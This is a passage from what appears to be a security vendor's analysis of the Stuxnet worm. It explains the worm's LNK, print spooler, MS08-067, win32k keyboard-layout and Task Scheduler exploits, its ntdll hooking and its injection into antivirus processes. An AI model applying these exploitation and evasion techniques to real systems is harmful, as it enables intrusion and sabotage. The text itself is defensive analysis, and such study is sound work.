[http://support.automation.siemens.com/WW/llisapi.dll?func=cslib.csinfo&lang=en&obji](http://support.automation.siemens.com/WW/llisapi.dll?func=cslib.csinfo&lang=en&objid=43876783&caller=view)\n[d=43876783&caller=view](http://support.automation.siemens.com/WW/llisapi.dll?func=cslib.csinfo&lang=en&objid=43876783&caller=view)\n\n    - [http://support.automation.siemens.com/WW/llisapi.dll?func=cslib.csinfo&objId=43876](http://support.automation.siemens.com/WW/llisapi.dll?func=cslib.csinfo&objId=43876783&objAction=csOpen&nodeid0=10805449&lang=en&siteid=cseus&aktprim=0&extranet=standard&viewreg=WW)\n[783&objAction=csOpen&nodeid0=10805449&lang=en&siteid=cseus&aktprim=0&extranet=stan](http://support.automation.siemens.com/WW/llisapi.dll?func=cslib.csinfo&objId=43876783&objAction=csOpen&nodeid0=10805449&lang=en&siteid=cseus&aktprim=0&extranet=standard&viewreg=WW)\n[dard&viewreg=WW](http://support.automation.siemens.com/WW/llisapi.dll?func=cslib.csinfo&objId=43876783&objAction=csOpen&nodeid0=10805449&lang=en&siteid=cseus&aktprim=0&extranet=standard&viewreg=WW)\n\nA number of new malware families were identified using same vulnerability in late July, and a number of\nother families such as Win32/Sality generated new variants that also used it.\nWin32/TrojanDownloader.Chymine.A downloads Win32/Spy.Agent.NSO keylogger;\nWin32/Autorun.VB.RP, and is similar to malware described by ISC on 21[st] July\n[(http://isc.sans.edu/diary.html?storyid=9229 ), but updated to include the CVE-2010-2568 exploit for](http://isc.sans.edu/diary.html?storyid=9229%20)\npropagation.\n\n[Pierre-Marc Bureau and David Harley blogged on the subject at http://blog.eset.com/2010/07/22/new-](http://blog.eset.com/2010/07/22/new-malicious-lnks-here-we-go)\n[malicious-lnks-here-we-go, and Harley explored the issues further in “Shortcuts to Insecurity: .LNK](http://blog.eset.com/2010/07/22/new-malicious-lnks-here-we-go)\n[Exploits” at http://securityweek.com/shortcuts-insecurity-lnk-exploits, and “Chim Chymine: a lucky](http://securityweek.com/shortcuts-insecurity-lnk-exploits)\nsweep?” in the September issue of Virus Bulletin.\n\n[Aryeh Goretsky’s blog at http://blog.eset.com/2010/08/02/save-your-work-microsoft-releases-critical-](http://blog.eset.com/2010/08/02/save-your-work-microsoft-releases-critical-security-patch)\n[security-patch](http://blog.eset.com/2010/08/02/save-your-work-microsoft-releases-critical-security-patch) comments on the Microsoft patch which finally appeared at the beginning of August: see\n[http://www.microsoft.com/technet/security/bulletin/MS10-046.mspx.](http://www.microsoft.com/technet/security/bulletin/MS10-046.mspx)\n\nFurther Microsoft issues were addressed in September, as described in this document. See also\n[http://www.scmagazineuk.com/microsoft-plugs-stuxnet-problems-as-nine-bulletins-are-released-on-](http://www.scmagazineuk.com/microsoft-plugs-stuxnet-problems-as-nine-bulletins-are-released-on-patch-tuesday/article/178911/?DCMP=EMC-SCUK_Newswire)\n[patch-tuesday/article/178911/?DCMP=EMC-SCUK_Newswire.](http://www.scmagazineuk.com/microsoft-plugs-stuxnet-problems-as-nine-bulletins-are-released-on-patch-tuesday/article/178911/?DCMP=EMC-SCUK_Newswire)\n\nMicrosoft released a security update to address the Print Spooler Service vulnerability used by Stuxnet.\nThe vulnerability only exists where a printer is shared, which is not a default.\n\n       - [http://blogs.technet.com/b/msrc/;](http://blogs.technet.com/b/msrc/)\n\n         - [http://www.microsoft.com/technet/security/bulletin/ms10-061.mspx;](http://www.microsoft.com/technet/security/bulletin/ms10-061.mspx)\n\n       - [http://blogs.technet.com/b/srd/archive/2010/09/14/ms10-061-printer-spooler-](http://blogs.technet.com/b/srd/archive/2010/09/14/ms10-061-printer-spooler-vulnerability.aspx)\n[vulnerability.aspx.](http://blogs.technet.com/b/srd/archive/2010/09/14/ms10-061-printer-spooler-vulnerability.aspx)\n\nFurther fixes promised for two Elevation of Privilege vulnerabilities.\n\nRalph Langner’s analysis of how Stuxnet affects a vulnerable installation was further discussed at the\nACS conference in September 2010, but AV industry analysis did not fully concur.\n\n       - [http://www.langner.com/en/index.htm;](http://www.langner.com/en/index.htm)\n\n       - [http://realtimeacs.com/?page_id=65;](http://realtimeacs.com/?page_id=65%20)\n\n       - [http://realtimeacs.com/?page_id=66;](http://realtimeacs.com/?page_id=66%20)\n\n       - [http://www.symantec.com/connect/blogs/exploring-stuxnet-s-plc-infection-](http://www.symantec.com/connect/blogs/exploring-stuxnet-s-plc-infection-process)\nprocess.\n\nRelated last-minute presentations promised for Virus Bulletin 2010:\n[http://www.virusbtn.com/conference/vb2010/programme/index](http://www.virusbtn.com/conference/vb2010/programme/index)\n\n\n-----\n\n## 3 Distribution\n\nThere are four ways the rootkit can distribute itself: by means of flash drives, through network shares,\nthrough an RPC vulnerability and through the recently patched MS10-061 Print Spooler vulnerability.\n\n### 3.1 The LNK exploit\n\nMicrosoft Security Advisory (2286198) CVE-2010-2568 includes links to detailed information about this\n[exploit. http://www.microsoft.com/technet/security/advisory/2286198.mspx. ESET allocated a separate](http://www.microsoft.com/technet/security/advisory/2286198.mspx)\ndetection family LNK/Autostart for the detection of attacks using this vulnerability. This vulnerability\nwas known to be in the wild for over a month even after it was identified before Microsoft were able to\nrelease a patch for it in late August 2010, as described in the following bulletin:\n[(http://www.microsoft.com/technet/security/bulletin/MS10-046.mspx).](http://www.microsoft.com/technet/security/bulletin/MS10-046.mspx)\n\nThe vulnerability is not based on a standard means of exploitation, where you would expect to need to\nprepare exploit with shellcode, which would make use of the vulnerability. In fact _any .LNK file can_\nexploit it, at exploitation CVE-2010-2568 is used feature .LNK files, when displayed in windows explorer\nand the icon for a .LNK file is loaded from a CPL file (Windows Control Panel file). Actually, the CPL file\nrepresents a conventional dynamic link library and this is the crux of the vulnerability. The role of the\npayload module will be indicated in the path to the CPL file.\n\n**Figure 3.1 – Information about CPL File**\n\nSo below we can see the general scheme of the Shell Link (. LNK) Binary File Format\n[(http://www.stdlib.com/art6-Shortcut-File-Format-lnk.html).](http://www.stdlib.com/art6-Shortcut-File-Format-lnk.html)\n\n\n-----\n\n**Figure 3.2 – Scheme of Shell Link (.LNK) Binary File Format**\n\nThe most interesting feature here is hidden in the File Location Info field, which specifies the path from\nwhich the CPL file should be loaded. A vulnerability was found in Windows Shell which could allow code\nexecution if the icon of a specially crafted shortcut is merely displayed. Here is a malicious .LNK file from\nan infected USB flash drive:\n\n**Figure 3.3 – Malware .LNK File from an Infected USB Flash Drive**\n\nIn the File Location Info field there is a path to the file that contains the payload that should be\nexecuted. In this case, the path points to an external drive, and when this is viewed in Windows Explorer\nit causes the system to execute ~wtr4141.tmp. More information on the distribution using external USB\nand media devices can be read in the section devoted to precisely this functionality.\n\n\n-----\n\nIn all the analyzed malicious .LNK files we have seen, there is a feature that consists of two GUID\nsequences. These sequences indicate the following:\n\n**Figure 3.4 – GUID from .LNK Files**\n\nThe .LNK file most likely points to and loads a CPL file. When the directory containing the crafted .LNK\nexploit is opened with Windows Explorer, the following chain of function calls will eventually lead to a\nfunction call _LoadLibraryW(). When the function_ _LoadLibraryW() is called, the malware DLL will be_\nexecuted.\n\n**Figure 3.5 – A Chain of Calls**\n\nIf we trace this chain of calls in the debugger, we see confirmation of all the facts described above. Thus\nwe can execute any malicious module, as _LoadLibraryW() receives as a parameter the path to the_\nmodule, which it must perform and no additional inspections are not happening.\n\n**Figure 3.6 –Loading Malicious Module**\n\nThis vulnerability highlights the fact that like many other bugs, this error has found its way into the\narchitecture of fundamental mechanisms, in this case for processing LNK files. Vulnerabilities which, as\nin this case, are symptomatic of fundamental design flaws are a nightmare for developers of any\nprogram, because they are always difficult and time-consuming to fix.\n\n\n-----\n\n**3.1.1** **Propagation via External Storage Devices**\n\nSince the vulnerability is based on the mechanism for the display .LNK files, it is possible to distribute\nmalware via removable media and USB drives without using Autorun-related infection. This propagation\nvector was used in the Stuxnet attack.\n\n**3.1.2** **Metasploit and WebDAV Exploit**\n\nA few days after the public debate concerning .LNK PoC exploitation, the Metasploit Framework\nreleased code including implementation of the exploit in order to allow remote attacks\n[(http://www.metasploit.com/modules/exploit/windows/browser/ms10_046_shortcut_icon_dllloader),](http://www.metasploit.com/modules/exploit/windows/browser/ms10_046_shortcut_icon_dllloader)\nPrior to the release of this exploit, it was believed that this vulnerability is not exploitable for remote\nattacks. Researchers from the Metasploit Project showed that this was not the case, by using the UNC\n[path to the WebDAV service (http://msdn.microsoft.com/en-us/library/cc227098(PROT.10).aspx). This](http://msdn.microsoft.com/en-us/library/cc227098(PROT.10).aspx)\nvulnerability is still functional. This exploit used a WebDAV service that can be used to execute an\narbitrary payload when accessed as a UNC path by following the link generated by Metasploit that\ndisplays the directory containing .LNK file and DLL module with payload.\n\n**Figure 3.7 – WebDAV Directory Generated by Metasploit**\n\nThe .LNK file contains the network path to the module with the payload.\n\n**Figure 3.8 – .LNK File Generated by Metasploit**\n\nThe vulnerability in .LNK files and the recently discovered DLL Hijacking vulnerability\n[(http://www.microsoft.com/technet/security/advisory/2269637.mspx) have much in common, both in](http://www.microsoft.com/technet/security/advisory/2269637.mspx)\nthe nature of their appearance, and in the ways in which they’ve been exploited.\n\n**3.1.3** **What Do DLL Hijacking Flaws and the LNK Exploit have in Common?**\n\nWhile we have been writing this report public information was released about DLL Hijacking flaws\n(Microsoft Security Advisory 2269637) and we noted some association with or resemblance to the .LNK\n\n\n-----\n\nfiles vulnerability. Both vulnerabilities are inherent design flaws and in both cases the function\n_LoadLibrary() is used. The directory where the exploitative file is found can be situated in a USB drive, an_\nextracted archive, or a remote network share. In both cases we find spoofed paths to a loadable module\nand the possibility of a remote attack via the WebDAV service.\n\nWhat other vulnerabilities are stored in Windows operating systems, nobody knows. Most likely, this\nvector of attack will undergo a thorough research and it might be that something else equally\ninteresting is awaiting us in the near future.\n\n\n-----\n\n### 3.2 LNK Vulnerability in Stuxnet\n\nThis is the first way in which the rootkit distributes itself. When you inspect a flash USB drive infected\nwith the Stuxnet worm you can expect to find 6 files there as on the following screenshot:\n\n**Figure 3.9 – The Worm’s Files on a USB Flash Drive**\n\n    - Copy of Shortcut to.lnk;\n\n    - Copy of Copy of Shortcut to.lnk;\n\n    - Copy of Copy of Copy of Shortcut to.lnk;\n\n    - Copy of Copy of Copy of Copy of Shortcut to.lnk;\n\n    - ~WTR4141.TMP;\n\n    - ~WTR4132.TMP.\n\nThe first four files are LNK files – these are the files that specify how the Icon of other files should be\ndisplayed. The files with LNK extension are different: here is an example of the contents of one of them:\n\n**Figure 3.10 – Contents of the .LNK Files**\n\nThe worm exploits the CVE-2010-2568 vulnerability (see section The LNK exploit for details) to infect the\nsystem. You can see in the figure above the highlighted name of the module to be loaded during the\nexploitation of the vulnerability. When a user tries to open an infected USB flash drive with an\napplication that can display icons for shortcuts, the file with the name ~WTR4141.TMP is loaded and its\nentry point is called. The file is, in fact, a dynamic link library, the main purpose of which is to load\nanother file with the name ~WTR4132.TMP from the infected flash drive.\n\n\n-----\n\nThe files with the .LNK filename extension are essentially the same except they specify different paths to\nthe single file:\n\n    - _\\\\.\\STORAGE#Volume#_??_USBSTOR#Disk&Ven_____USB&Prod_FLASH_DRIVE&Rev_#1_\n_2345000100000000173&0#{53f56307-b6bf-11d0-94f2-00a0c91efb8b}#{53f5630d-b6bf-11d0-_\n_94f2-00a0c91efb8b}\\~WTR4141.tmp;_\n\n    - _\\\\.\\STORAGE#Volume#1&19f7e59c&0&_??_USBSTOR#Disk&Ven_____USB&Prod_FLASH_\n__DRIVE&Rev_#12345000100000000173&0#{53f56307-b6bf-11d0-94f2-_\n_00a0c91efb8b}#{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}\\~WTR4141.tmp;_\n\n    - _\\\\.\\STORAGE#RemovableMedia#8&1c5235dc&0&RM#{53f5630d-b6bf-11d0-94f2-_\n_00a0c91efb8b}\\~WTR4141.tmp;_\n\n    - _\\\\.\\STORAGE#RemovableMedia#7&1c5235dc&0&RM#{53f5630d-b6bf-11d0-94f2-_\n_00a0c91efb8b}\\~WTR4141.tmp._\n\nAll these strings specify a path to the file located on the removable drive, and are used instead of a short\nform of the path with a drive letter. The first part of the path to the file (before the backslash \"\\\" that\nprecedes the filename) is a symbolic link name referring to the corresponding volume, as we can see on\nthe figure below:\n\n**Figure 3.11 – Symbolic Link Names of Volumes**\n\nThe first entry in figure 4.2.3 corresponds to the volume representing a USB flash drive, the name of\nwhich is \\Device\\HarddiskVolume5. Notably, that drive letters are symbolic link names too that refer to\nthe same device objects:\n\n**Figure 3.12 – Drive letters**\n\nStuxnet uses the long versions of pathnames because it is impossible to predict what letter corresponds\nto a removable drive in a remote system, and as a result, the short paths are likely to be incorrect in\nsome cases. The longer variant of a path is constructed with respect to certain rules and configuration\ninformation obtained from the hardware, so that we can predict with considerable accuracy what\nsymbolic link name corresponds to a device on a remote machine.\n\nThe rules according to which these symbolic link are constructed vary depending on the operating\nsystem, which is why Stuxnet uses four distinct .LNK files. For instance, the first entry in the list\npresented above won't work on Windows XP but will work on Windows 7, the second entry works on\nWindows Vista, while the last two entries work on Windows XP, Windows Server 2003 and Windows\n2000.\n\n\n-----\n\n### 3.3 The MS10-061 Attack Vector\n\nAnother way in which the worm replicates itself over the network exploits a vulnerability in Window\nSpooler (MS10-061). Machines with file and printer sharing turned on are vulnerable to the attack. This\nvulnerability results in privilege escalation allowing a remote user using a Guest account to write into\n_%SYSTEM% directory of the target machine._\n\nThe attack is performed in two stages: during the first stage the worm copies the dropper and additional\nfile into _Windows\\System32\\winsta.exe_ and _Windows\\System32\\wbem\\mof\\sysnullevnt.mof_\nrespectively, while at the second stage the dropper is executed.\n\nThe first stage exploits the MS10-061 vulnerability. Under certain conditions the spooler improperly\nimpersonates a client that sends two “documents” for printing as we can see on the figure below.\n\n**Figure 3.13 – \"Printing\" Malicious Files into Files in %SYSTEM% Directory**\n\nThese documents are “printed” to files in the _%SYSTEM% directory while a user has Guest_\nprivileges that shouldn’t entail access rights to the _%SYSTEM%_ directory. During exploitation of the\nvulnerability, a thread of the process spoolsv.exe calls an API function StartDocPrinter() with parameter\nspecifying the following information about document to be printed:\n```\ntypedef struct _DOC_INFO_1 { \n    LPTSTR pDocName; // Default\n    LPTSTR pOutputFile;  // winsta.exe or wbem\\mof\\sysnullevnt.mof\n    LPTSTR pDatatype; // RAW\n} DOC_INFO_1;\n\n```\nIn the middle of September 2010, Microsoft released a security patch to fix MS10-061. We have\ncompared the original executable spoolsv.exe with the patched executable and found some functional\ndifferences. One of the most important differences concerns the _YStartDocPrinter function which is_\neventually called in order to print a document. On the figure below we provide a graphical\nrepresentation of the functions.\n\n\n-----\n\n**Figure 3.14 – Functional Changes in the Patched Version**\n\nThe left-hand side represents the patched function while on the right-hand the original is displayed. The\nfunctions are in general the same, but some additional checks have been added, and these are\nhighlighted in red. Before printing a document the function performs the following checks:\n\n    - whether the caller belongs to Local group;\n\n    - _whether OutputFile parameter is NULL or equal to a port name of the printer: otherwise_\na client needs to have appropriate access rights to write to the specified file.\n\nThe sequence of check is presented on the figure below.\n\n\n-----\n\n**Figure 3.15 – Additional Checks Implemented by Microsoft**\n\nThe second stage of the attack employs the file wbem\\mof\\sysnullevnt.mof : that is, a Managed Object\n_Format file. Files of this type are used to create or register providers, events, and event categories for_\nWMI. Under certain conditions this file runs _winsta.exe_ (the dropper) and its execution by the system\nresults in the infection of the system.\n\n\n-----\n\n### 3.4 Network Shared Folders And RPC Vulnerability (MS08-067)\n\nThe worm is also capable of distributing itself over the network through shared folders. It scans network\nshares c$ and admin$ on the remote computers and installs a file (dropper) there with the name\n_DEFRAG<GetTickCount>.TMP, and schedules a task to be executed on the next day:_\n\n_rundll.exe \"C:\\addins\\DEFRAGdc2d0.TMP\", DllGetClassObject_\n\n**Figure 3.16 – Stuxnet Schedules Dropper Execution on the Next Day**\n\nStuxnet’s exploitation of the MS08-67 vulnerability to propagate itself through the network is\ncomparable to the use of the same vulnerability by the network worm Conficker. Its exploit is\nimplemented as a separate module. We have compared the two exploit implementations in Conficker\nand Stuxnet and found that the shell codes that have been used are different. Stuxnet's shell code is\nrather sophisticated and employs advanced techniques that have recently become widely spread such\nas ROP (return oriented programming).\n\n\n-----\n\n### 3.5 0-day in Win32k.sys (MS10-073)\n\nWhen the Win32/Stuxnet worm didn’t have enough privileges to install itself in the system it\nexploited a recently patched (MS10-73) 0-day vulnerability in the win32k.sys system module to escalate\nprivilege level up to SYSTEM, which enabled it to perform any tasks it likes on the local machine. The\nvulnerable systems are:\n\n    - Microsoft Windows 2000;\n\n    - Unpatched Windows XP (all service packs).\n\nActually, in theory, it is possible to exploit this vulnerability on the other systems as the code\npertaining to the vulnerability exists (see figure 3.17), but there are no known ways to reach it (i. e. the\ncode that transfers control to the shell code) and as a result the shell code won't be executed.\n\nTo perform this trick, Stuxnet loads a specially crafted keyboard layout file, making it possible to\nexecute arbitrary code with SYSTEM privileges. The escalation of privileges occurs while dispatching\ninput from the keyboard in Win32k.sys module. While processing input from the keyboard using the\n_NtUserSendInput system service, the following code is executed:_\n\n**Figure 3.17 – A fragment of the executed code during processing keyboard input**\n\nThe purpose of this code is to determine how to dispatch virtual key code of the pressed button.\nRegister ecx specifies the type of the handler according to the current keyboard layout to be called in\n__aNLSVKProc procedure table. This table consists of three handlers:_\n\n**Figure 3.18 – _aNLSVKProc procedure table**\n\nAs we can see from the figure above (3.18), the _aNLSVKProc is followed by 3 DWORDs, the last\nof which (highlighted in red) can be interpreted as a pointer pointing to 0x60636261 in the user-mode\naddress space. Thus, if we set the ecx register in the code in figure 1 with the proper value, namely 5,\nthen we can execute code at 0x6036261 with SYSTEM privileges.\n\nWe can manipulate the ecx register in this code by loading a specially crafted keyboard layout\nfile specifying that certain virtual key codes should call the procedure indexed as 5. The keyboard layout\nfile is a dynamic link library of which the _.data section is specially structured. Below we present a_\nstructure that maps virtual keys to corresponding procedures in the table.\n\n\n-----\n\n```\ntypedef struct _VK_TO_FUNCTION_TABLE {\n    BYTE Vk; // Virtual-key code\n    BYTE NLSFEProcType;  // Index of the procedure in _aNLSVKProc table \n                      // corresponding to the virtual key\n    BYTE NLSFEProcCurrent;\n    BYTE NLSFEProcSwitch;\n    VK_FPARAM NLSFEProc[8];\n    VK_FPARAM NLSFEProcAlt[8];\n} VK_F, *KBD_LONG_POINTER PVK_F;\n\n```\nThe worm loads a special keyboard layout file by calling _NtUserLoadKeyboardLayoutEx and_\npassing it the following hexadecimal constant 0x01AE0160 as an offTable parameter. The low word of\nthis parameter specifies the RVA (Relative Virtual Address) of the KBDTABLES structure from the\nbeginning of the file, while the high word specifies the RVA of KBDNLSTABLES, which is of particular\ninterest. The latter structure determines the address and size of the array of VK_F structures contained\nin the file.\n```\ntypedef struct tagKbdNlsLayer {\n    USHORT OEMIdentifier;\n    USHORT LayoutInformation;\n    UINT NumOfVkToF; // Size of array of VK_F structures\n    PVK_F pVkToF; // RVA of array of VK_F structures in the \n                      // keyboard layout file\n    INT NumOfMouseVKey;\n    USHORT *KBD_LONG_POINTER pusMouseVKey;\n} KBDNLSTABLES, *KBD_LONG_POINTER PKBDNLSTABLES;\n\n```\nIn figure 3.19 below we present the contents of the .data section where we can see that the\nstructure KBDNLSTABLES located at RVA 0x1AE specifies one structure VK_F located at RVA 0x01C2.\n\n**Figure 3.19 – .data section of the crafted keyboard layout file**\n\nAs we can see, the keyboard layout file contains exactly one VK_F structure that maps a virtualkey with code equal to procedure 0 in _aNLSVKProc with indexed as 5.\n\n\n-----\n\nOne thing we need to do in order to exploit this vulnerability is to allocate a buffer for the code\nto be executed at address 0x60636261 as in the case with Stuxnet, which allocates 32KB of memory at\n_0x60630000 (figure 3.20)_ and writes shell code at 0x60636261 (figure 3.21):\n\n**Figure 3.20 – Stuxnet allocates 32KB of memory at 0x60630000 for shell code**\n\n**Figure 3.21 – The beginning of the shell code at 0x60636261**\n\n#### Microsoft's patch\n\nOn the 13th of October 2010 Microsoft released a security patch that fixes this vulnerability.\nWe've compared unpatched and patched Win32k.sys modules to understand the way the vulnerability\nwas fixed. As we expected MS added an additional check in the code handling keyboard input (namely in\nthe function xxxEKNLSProcs) to prevent NLSFEProcType field of the VK_F structure of being out of the\nboundaries __aNLSVKProc table. In the figures below we can see unpatched (figure 3.22) and patched_\ncode (figure 3.23) respectively where the additional check is highlighted with the red border.\n\nAs we can see, before calling a procedure from __aNLSVKProc table the check is performed to_\nensure that the index of the procedure doesn't exceed the value of 2 (correct values are 0,1,2).\n\n\n-----\n\n**Figure 3.22 – A part of the xxxEKNLSProcs procedure before patching**\n\n\n-----\n\n**Figure 3.23 – A part of the xxxEKNLSProcs procedure after patching**\n\n\n-----\n\n## 3.6 Exploiting Unpatched 0-day in Task Scheduler\n\nTo circumvent UAC (User Account Control) introduced into Windows operating systems starting\nfrom Windows Vista, Stuxnet exploits a vulnerability in the Task Scheduler service which allows it to\nelevate privileges. When UAC is enabled, application software started by an administrator runs with\nuser privileges by default. In certain cases when an application requires administrative rights, the dialog\nbox is displayed that prompts a user to allow privilege elevation (see figure bellow).\n\n**Figure 3.24 – Dialog box prompting user to allow privilege elevation**\n\nExploiting this vulnerability in Task Scheduler allows Stuxnet to elevate its privileges up to\nSYSTEM level without displaying any interactive dialogs to the user, provided that the user is a member\nof local administrators group.\n\n\n-----\n\n## 4 Stuxnet Implementation\n\n### 4.1 User-mode functionality\n\nThere are several modules that constitute the user-mode functionality. The main module that contains\nthe others is a large dynamic link library. Other modules including kernel mode drivers are stored in the\nDLL’s resources.\n\n**4.1.1** **Overview of the main module**\n\nThe main module is represented as a large DLL packed with UPX. Its unpacked size is 1233920 bytes\n(1.18 MB).\n\n**Figure 4.1 – Section Table of the Main Module**\n\n**Figure 4.2 – Resources of the Main Module**\n\nThe main module exports 21 functions by ordinal. Each function has its own purpose as will be\ndescribed in the section Exported functions.\n\n\n-----\n\n**Figure 4.3 – Export Address Table of the Main Module**\n\n**4.1.2** **Injecting code**\n\nThe malware employs quite an interesting technique to inject code into the address space of a process\nand execute exported functions. The user-mode modules of Stuxnet are implemented as dynamic link\nlibraries, and exported functions are frequently executed or injected into the address space of a process.\nThere are two different cases: when a module is loaded into an existing process, or when the module is\ninjected into a new process.\n\n**4.1.3** **Injecting into a current process**\n\nConsider the first case, when one of the user-mode components wants to call a function exported by\nanother component in the context of the calling process. To avoid being detected by antivirus software\nthe malware loads a module in the following way:\n\n1. It allocates a memory buffer in the calling process for the module to be loaded;\n2. It patches Ntdll.dll system library: namely, it hooks the following functions:\n\n_a._ _ZwMapViewOfSection;_\n_b._ _ZwCreateSection;_\n_c._ _ZwOpenFile;_\n_d._ _ZwClose;_\n_e._ _ZwQueryAttributesFile;_\n_f._ _ZwQuerySection;_\n3. It calls LoadLibraryW API, exported from kerenl32.dll and passing it as a parameter a\nspecially constructed library name, using the pattern: KERNEL32.DLL.ASLR.XXXXXXXX or\nSHELL32.DLL.ASLR.XXXXXXXX, where XXXXXXXX is a random hexadecimal number;\n4. It calls desired exported function;\n\n\n-----\n\n5. It calls FreeLibrary API function to free loaded library.\n\nTo hook the functions specified above, the malware allocates a memory buffer for code that will\ndispatch calls to hooked functions, overwrite some data in MZ header of the image with the code that\ntransfers control to the new functions, and hook the original functions by overwriting its bodies, the\nresult of these manipulations is presented on figure 4.1.4.\n\n**Figure 4.4 – Hooking Functions in ntdll.dll**\n\n\n-----\n\nThe MZ header of ntdll.dll is overwritten with the following code:\n\n**Figure 4.5 – Code Injected into MZ Header of ntdll.dll**\n\nThe purpose of all these manipulations is to load a non-existent library legitimately (at least as far as the\nsystem is concerned). The hook functions allow the malware to load module as if it were a library that\nreally existed. When a library with specific name (KERNEL32.DLL.ASLR or SHELL32.DLL.ASLR) is\nrequested, these functions map the desired module into the address space of the process. As a result,\nthe loaded module looks like a real dynamic link library except that there is no file with the name of the\nlibrary on the hard drive, which reduces probability of detection by heuristic methods. Some anti-rootkit\nsoftware does detect it and warn users:\n\n\n-----\n\n**Figure 4.6 – GMER Detected that Loaded Library doesn't have Corresponding File**\n\n**4.1.4** **Injecting into a new process**\n\nIn the second case when the malware requires the module to be executed in a newly created process it\nuses different approach. To achieve this Stuxnet:\n\n1. Creates a host process;\n2. Replaces the image of the process with the module to execute and with supplemental\ncode that will load the module and call specified export passing parameters (as in the first case\ndescribed).\n\nDepending on the processes present in the system the malware chooses the host process from\nthe following list:\n\n    - lssas.exe (system process);\n\n    - avp.exe (Kaspersky);\n\n    - mcshield.exe (McAfee VirusScan);\n\n    - avguard.exe (AntiVir Personal Edition);\n\n    - bdagent.exe (BitDefender Switch Agent);\n\n    - UmxCfg.exe (eTrust Configuration Engine from Computer Associates International);\n\n    - fsdfwd.exe (F-Secure Anti-Virus suite);\n\n    - rtvscan.exe (Symantec Real Time Virus Scan service);\n\n    - ccSvcHst.exe (Symantec Service Framework);\n\n    - ekrn.exe (ESET Antivirus Service Process);\n\n    - tmproxy.exe (PC-cillin antivirus software from TrendMicro);\n\nThe malware enumerates processes in the system and if it finds a process whose executable\nimage has a name present in this list, and which meets certain criteria, then it is chosen to be a host for\nthe module.\n\n**4.1.5** **Installation**\n\nWe can consider the case when ~WTR4141. TMP is loaded due to the vulnerability (CVE-2010-2568) in\ndisplaying shortcuts for icons as described in section 1.6. As soon as the file is loaded it hooks the\nfollowing functions to hide the worm's files on a flash USB drive.\n\n\n-----\n\n  - In kernel32.dll:\n\n`o` FindFirstFileW;\n\n`o` FindNextFileW;\n\n`o` FindFirstFileExW;\n\n  - In ntdll.dll:\n\n`o` NtQueryDirectoryFile;\n\n`o` ZwQueryDirectoryFile.\n\nThis function filters the files that satisfy the following criteria from being displayed:\n\n  - files with \".LNK\" extension of which the file size is equal to 1471 (0x104b) bytes;\n\n  - files with \".TMP\" extension of which the name consists of 12 characters (including filename\nextension) in the following format: \"~WTRabcd.TMP\", where _a,b,c,d are digits from 0 to 9 which_\nsum modulo 10 equals 0 (\"~WTR4411.TMP\" for example).\n\nThis module loads another module. ~WTR4132.TMP, using a method described in previous\nsection. ~WTR4132.TMP extracts from its section with \".stub\" name another component – the main\ndynamic link library of Stuxnet - then loads it and calls exported function number 15.\n\n**Figure 4.7 – Installation of the Malware**\n\nThis function checks whether the token of the current user belongs to the group of the local\nadministrators on the computer: if so, it executes the exported function with ordinal 0x10 in a new\nprocess. This function installs Stuxnet's components onto the system.\n\n\n-----\n\n**4.1.6** **Exported functions**\n\nHere we will describe the functions exported by the main module.\n\n**_Export 1_**\n\nThis function has the same functionality as the function number 32 except it waits for 60 seconds prior\ncreating and starting Stuxnet's RPC Server.\n\n**_Export 2_**\n\nThis function is called in address space of the process with name s7tgtopx.exe and CCProjectMgr.exe\nand hooks certain functions by modifying the import address table of the corresponding modules. The\ntable below gives the names of the patched modules and hooked functions:\n\n**Table 4.1.1 – Patched Modules and Hooked Functions**\n\n**Library exporting hooked**\n**Patched module** **Hooked function**\n\n**function**\n\ns7apromx.dll CreateFileA kernel32.dll\n\nmfc42.dll CreateFileA kernel32.dll\n\nmsvcrt.dll CreateFileA kernel32.dll\n\nCCProjectMgr.exe StgOpenStorage ole32.dll\n\nThe hook for CreateFileA monitors opening files with the extension .S7P while the hook for\nStgOpenStorage monitors files with extension .MCP.\n\n**_Export 4_**\n\nThis function performs the full cleanup of the malware from the system. It starts a new process, injects\nthe main module into it and calls exported function 18 (see 18).\n\n**_Export 5_**\n\nThis function checks whether the kernel-mode driver MrxCls.sys is properly installed in the system.\n\n**_Export 6_**\n\nThis function returns current version of Stuxnet installed in the system.\n\n**_Export 7_**\n\nThe same as function number 6\n\n|Patched module|Hooked function|Library exporting hooked function|\n|---|---|---|\n|s7apromx.dll|CreateFileA|kernel32.dll|\n|mfc42.dll|CreateFileA|kernel32.dll|\n|msvcrt.dll|CreateFileA|kernel32.dll|\n|CCProjectMgr.exe|StgOpenStorage|ole32.dll|\n\n\n-----\n\n**_Export 9_**\n\nThis function builds Stuxnet's dropper from the files located in the system and runs it. The dropper is\nconstructed from the following files which seems to be a components of Stuxnet:\n\n    - _%Dir%\\XUTILS\\listen\\XR000000.MDX;_\n\n    - _%Dir%\\XUTILS\\links\\S7P00001.DBF;_\n\n    - _%Dir%\\XUTILS\\listen\\S7000001.MDX._\n\n_%Dir% passed as a parameter by a caller of the function._\n\n**_Export 10_**\n\nThis function performs the same actions as function number 9 which builds and runs the Stuxnet\ndropper. The only difference between these functions is that this function can build the dropper from\nthe set of the files used in function number 9 as well as from the following files:\n\n    - _%Dir%\\GracS\\cc_alg.sav;_\n\n    - _%Dir%\\GracS\\\\db_log.sav;_\n\n    - _%Dir%\\GracS\\\\cc_tag.sav._\n\nParameter %Dir% is also specified by a caller.\n\n**_Export 14_**\n\nThis function manipulates with files which paths it receives as a parameter.\n\n**_Export 15_**\n\nThis routine initiates infection of the system. See section 1.8.1.4 for more details.\n\n**_Export 16_**\n\nThis function installs the malware's components in the system and performs the following tasks:\n\n    - Drops and installs kernel-mode drivers: MrxNet.sys and MrxCls.sys;\n\n    - Drops the main dll in %SystemRoot%\\inf\\oem7A.PNF;\n\n    - Drops Stuxnet's configuration data in %SystemRoot%\\inf\\mdmcpq3.PNF;\n\n    - Creates tracing file in %SystemRoot%\\inf\\oem6C.PNF;\n\n    - Drops data file in %SystemRoot%\\inf\\mdmeric3.PNF;\n\n    - Injects the main dll into services.exe process and executes the function exported as\nordinal 32;\n\n    - Injects the main dll into the s7tgtopx.exe process if any exists, and executes exported\nfunction 2 there.\n\n**_Export 17_**\n\nThis function replaces s7otbxdx.dll with a malicious DLL. It moves the original library into a file called\ns7otbxdsx.dll. The malicious library is a wrapper for the original DLL: that is, it simply passes control to\nthe original library, except in the case of certain functions which it hooks:\n\n    - s7_event;\n\n    - s7ag_bub_cycl_read_create;\n\n\n-----\n\n    - s7ag_bub_read_var;\n\n    - 